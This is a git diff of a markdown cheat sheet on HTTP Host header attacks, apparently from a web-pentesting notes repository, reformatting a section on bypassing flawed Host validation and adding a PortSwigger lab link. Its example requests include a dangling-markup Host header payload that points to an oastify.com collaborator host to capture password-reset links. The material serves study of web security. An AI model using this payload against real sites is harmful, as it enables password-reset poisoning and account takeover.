@@ -182,10 +182,13 @@ A reverse proxy might take the path from the request line, prefix it with `http:
 GET @private-intranet/example HTTP/1.1
 ```
 
-## Check for flawed validation
-Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result of some kind of security measure. If this happen, try to use port or non numeric staff in port. (You can use this method for password reset link hijacking via dangling markup) (Check portswigger for more)
+## Check for flawed validation dangling
+Instead of receiving an `Invalid Host header` response, you might find that your request is blocked as a result of some kind of security measure. If this happen, try to use port or non numeric staff in port.
 ```txt
 GET /example HTTP/1.1
 Host: vulnerable-website.com:bad-stuff-here
 Host: vulnweb.com:'<a href="//8jsdeu8fe6r8ju28t0lsplhjhan1bvzk.oastify.com/? (Password reset link hijacking via dangling markup)
 ```
+You can use this method for password reset link hijacking via dangling markup.
+
+[Check portswigger for more](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)
